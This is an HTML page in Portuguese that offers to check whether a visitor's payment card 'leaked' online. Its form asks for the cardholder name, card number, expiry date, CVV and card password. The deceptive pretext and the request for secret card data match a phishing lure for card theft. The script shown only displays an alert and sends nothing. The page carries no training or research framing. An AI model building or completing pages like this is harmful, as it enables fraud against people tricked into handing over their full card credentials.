<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Verificação de Cartão</title>
</head>
<body>
    <div class="container">
        <div class="left">
            <img src="front-card.jpg" alt="Frente do Cartão" id="front-card">
            <img src="back-card.jpg" alt="Verso do Cartão" id="back-card">
        </div>
        <div class="right">
            <h1>Veja se seu cartão <span>Vazou</span> na internet</h1>
            <form>
                <div class="form-group">
                    <label for="card-name">Nome no cartão</label>
                    <input type="text" id="card-name" placeholder="Nome no cartão">
                </div>
                <div class="form-group">
                    <label for="card-number">Número do cartão</label>
                    <input type="text" id="card-number" placeholder="1234 5678 9012 3456">
                </div>
                <div class="form-group">
                    <label for="expiry-date">Data de expiração</label>
                    <input type="text" id="expiry-date" placeholder="Data de expiração">
                </div>
                <div class="form-group">
                    <label for="cvv">CVV</label>
                    <input type="text" id="cvv" placeholder="CVV">
                </div>
                <div class="form-group">
                    <label for="card-password">Senha do cartão</label>
                    <input type="password" id="card-password" placeholder="Senha do cartão">
                </div>
                <button type="button" onclick="verifyCard()">Verificação</button>
            </form>
        </div>
    </div>
    <script>
        function verifyCard() {
            // Função de verificação do cartão
            alert('Verificação em andamento...');
        }
    </script>
</body>
</html>
